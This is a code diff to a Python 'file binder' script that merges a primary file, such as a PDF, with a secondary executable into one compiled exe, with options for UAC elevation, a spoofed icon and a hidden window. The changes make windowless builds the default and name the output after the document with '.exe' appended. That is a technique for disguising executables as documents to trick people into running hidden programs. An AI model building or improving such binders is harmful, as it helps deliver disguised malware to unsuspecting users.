@@ -152,7 +152,7 @@ if __name__ == "__main__":
     parser.add_argument('primary', help="Primary file.(Can be not a PE file, eg:pdf.)")
     parser.add_argument('secondary', help="secondary exe file.")
     parser.add_argument('--uac', action="store_true", help="Enable uac.")
-    parser.add_argument('--gui', action="store_true", help="Enable -mwindows CXXFLAG, works when the secondary is GUI exe file.")
+    parser.add_argument('--non-gui', dest="ngui", action="store_true", help="Disable -mwindows CXXFLAG, works when the secondary is GUI exe file.")
     parser.add_argument('--x86', action="store_true", help="Enable -m32 CXXFLAG, when build in x64 platform.")
     parser.add_argument('--ico', type=str, help="Set bind file icon.")
     parser.add_argument('--out', type=str, help="Output binded exe file.")
@@ -161,8 +161,10 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
     result = False
-    out = args.out if args.out else os.path.basename(args.primary).replace(".exe", "-new.exe")
-    cxxflag = "%s %s" % (str("-mwindows" if args.gui else ""), str("-m32" if args.x86 else ""))
+    primary_name = os.path.basename(args.primary)
+    out = args.out if args.out else primary_name.replace(".exe", "-new.exe") if primary_name.endswith(".exe") else str(primary_name + ".exe")
+    cxxflag = "%s %s" % (str("" if args.ngui else "-mwindows"), str("-m32" if args.x86 else ""))
+    progname = args.prog if args.prog else primary_name
 
     if args.ico:
         img = Image.open(args.ico)
@@ -194,10 +196,8 @@ if __name__ == "__main__":
         data = rb.read()
         data = data.replace("RES_1111", res1["res_name"])
         data = data.replace("RES_2222", res2["res_name"])
-
-        if args.prog:
-            data = data.replace("EXE1FILE", args.prog)
-            cxxflag += " -DPROG1"
+        data = data.replace("EXE1FILE", progname)
+        cxxflag += " -DPROG1"
 
     with open("main.cpp", "w") as wm:
         wm.write(data)
